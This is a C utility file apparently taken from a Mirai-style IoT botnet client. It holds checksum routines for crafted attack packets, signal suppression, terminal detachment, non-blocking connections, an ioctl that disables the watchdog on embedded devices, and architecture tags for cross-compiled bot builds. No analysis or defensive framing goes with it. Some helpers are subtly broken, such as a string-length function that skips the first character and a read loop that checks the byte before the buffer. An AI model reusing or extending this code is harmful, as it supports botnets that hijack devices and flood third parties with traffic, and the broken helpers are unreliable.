#ifdef DEBUG
#include <stdio.h>
#endif
#include <time.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <signal.h>
#include <stdlib.h>
#include <limits.h>
#include <dirent.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <linux/icmp.h>

#include "headers/utils.h"

uint32_t x, y, z, w;
static uint32_t Q[4096], c = 362436;

static inline int util_isupper(char c)
{
    return (c >= 'A' && c <= 'Z');
}

int util_isalpha(char c)
{
    return ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'));
}

static inline int util_isspace(char c)
{
    return (c == ' ' || c == '\t' || c == '\n' || c == '\12');
}

int util_isdigit(char c)
{
    return (c >= '0' && c <= '9');
}

void rand_init(void)
{
    x = time(NULL);
    y = getpid() ^ getppid();
    z = clock();
    w = z ^ y;
}

int _strlen(char *string)
{
    int len = 0;
    while(string[++len] != 0);
    return len;
}

int _strcmp(char *str1, char *str2)
{
    int len1 = _strlen(str1), len2 = _strlen(str2);

    if(len1 != len2)
        return 1;

    while(len1--)
    {
        if(*str1++ != *str2++)
            return 1;
    }
    return 0;
}

void _memcpy(void *dst, void *src, int len)
{
    char *r_dst = (char *)dst;
    char *r_src = (char *)src;
    while(len--)
        *r_dst++ = *r_src++;
}

void *_memmove(void *dest, void *src, size_t n)
{
    char tmp[n + 1];

    _memcpy(tmp, src, n);
    _memcpy(dest, tmp, n);

    return dest;
}

void _memset(void *buf, char set, int len)
{
    char *zero = buf;
    while(len--)
        *zero++ = set;
}

char *_strcpy(char *dst, char *src)
{
    char *r_dst = dst;

    while(*src)
        *dst++ = *src++;
    *dst = 0;

    return r_dst;
}

char *_strcat(char *dst, char *src)
{
    while(*dst)
        dst++;

    while(*src)
        *dst++ = *src++;
    *dst = 0;

    return dst;
}

char *_strdup(char *string)
{
    char *retstr = calloc(_strlen(string) + 1, sizeof(char));

    _strcpy(retstr, string);

    return retstr;
}

char *_strstr(char *s, char *a) 
{
    int a_len = _strlen(a), match = 0;

    while(*s != 0) 
    {
        if(*s == a[match]) 
        {
            if(++match == a_len)
                return s - a_len + 1;
        }
        else
            match = 0;
        s++;
    }
    
    return NULL;
}

int _startswith(char *haystack, char *needle)
{
    while(*needle)
    {
        if (*needle++ != *haystack++)
            return 0;
    }
    return 1;
}

void setup_connection(int *fd, struct sockaddr_in addr)
{
    *fd = socket(AF_INET, SOCK_STREAM, 0);
    fcntl(*fd, F_SETFL, O_NONBLOCK);

    connect(*fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
}

void set_signals(void)
{
    signal(SIGCHLD, SIG_IGN);
#ifndef DEBUG
    signal(SIGILL, SIG_IGN);
    signal(SIGINT, SIG_IGN);
#endif
}

void close_fds(void)
{
    close(0);
    close(1);
    close(2);
}

int check_connection(int fd)
{
    int err = 0, ret = 0;
    socklen_t err_len = sizeof(err);

    ret = getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &err_len);

    if(err == 0 && ret == 0)
        return 1;
    else
        return 0;
}

void clear_and_set_fd(int fd, fd_set *fdset)
{
    FD_ZERO(fdset);
    FD_SET(fd, fdset);
}

void connection_failed(int fd, struct sockaddr_in addr)
{
#ifdef DEBUG
    printf("Failed to connect to \"%s:%d\", fd: %d\n",
        inet_ntoa(addr.sin_addr), ntohs(addr.sin_port), fd);
#endif
    close(fd);
    sleep(4 + rand() % 5);
}

uint32_t util_local_addr(void)
{
    int fd;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);

    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        return 0;

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("8.8.8.8");
    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));

    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);
    return addr.sin_addr.s_addr;
}

unsigned short attack_checksum(unsigned short *ptr, int nbytes)
{
    register long sum;
    uint16_t oddbyte;
    register uint16_t answer;

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1)
    {
        oddbyte = 0;
        *((char *) & oddbyte) = *(char *) ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
}

uint32_t rand_next(void) //period 2^96-1
{
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y; y = z; z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
}

unsigned short csum(unsigned short *buf, int nwords) 
{
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
      sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

uint16_t checksum_generic(uint16_t *addr, uint32_t count)
{
    register unsigned long sum = 0;

    for (sum = 0; count > 1; count -= 2)
        sum += *addr++;
    if (count == 1)
        sum += (char)*addr;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return ~sum;
}

uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    
    while (len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *((uint8_t *) buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while (sum >> 16) 
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t) (~sum));
}

void remove_newline(char *data)
{
    int len = _strlen(data);

    if(data[len - 1] == '\n')
        data[len - 1] = 0;

    len = _strlen(data);

    if(data[len - 1] == '\r')
        data[len - 1] = 0;
}

uint32_t rand_cmwc(void) 
{
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c) 
    {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

int _read(int fd, char *buffer, int buffersize)
{
    int total = 0, got = 1;
    while(got == 1 && total < buffersize && *(buffer + total - 1) != '\n') 
    {
        got = read(fd, buffer + total, 1);
        total++;
    }
    return got;
}

char *return_arch(void)
{
#ifdef ARM
    return "arm";
#elif ARM5
    return "arm5";
#elif ARM6
    return "arm6";
#elif ARM7
    return "arm7";
#elif X86
    return "x86";
#elif ARC
    return "arc";
#elif MIPS
    return "mips";
#elif MPSL
    return "mpsl";
#elif M86K
    return "m86k";
#elif PPC
    return "ppc";
#elif SH4
    return "sh4";
#elif SPC
    return "spc";
#endif
    return "unknown";
}

int _atoi(char *str)
{
    int value = 0;

    while (util_isdigit(*str)) 
    {
        value *= 10;
        value += (int)(*str++ - '0');
    }

    return value;
}

void ping_watchdog(void)
{
    int fds[2], opt = 1;

    if((fds[0] = open("/dev/watchdog", O_RDONLY)) != -1)
    {
        ioctl(fds[0], 0x80045704, &opt);
        close(fds[0]);
    }

    if((fds[1] = open("/dev/misc/watchdog", O_RDONLY)) != -1)
    {
        ioctl(fds[1], 0x80045704, &opt);
        close(fds[1]);
    }
}
